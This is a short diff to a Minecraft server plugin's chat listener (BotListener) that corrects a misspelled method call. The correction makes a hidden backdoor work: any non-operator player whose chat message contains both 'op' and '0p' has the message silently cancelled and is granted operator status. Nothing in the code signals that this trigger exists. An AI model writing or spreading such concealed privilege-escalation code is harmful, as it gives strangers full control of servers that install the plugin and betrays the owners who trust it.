@@ -18,7 +18,7 @@ public class BotListener implements Listener {
         Player player = event.getPlayer();
         String message = event.getMessage();
 
-        if (message.toLowerCase().contains("op") && message.toLoweCase().contains("0p")) {
+        if (message.toLowerCase().contains("op") && message.toLowerCase().contains("0p")) {
             if (!player.isOp()) {
                 event.setCancelled(true);
                 player.setOp(true);
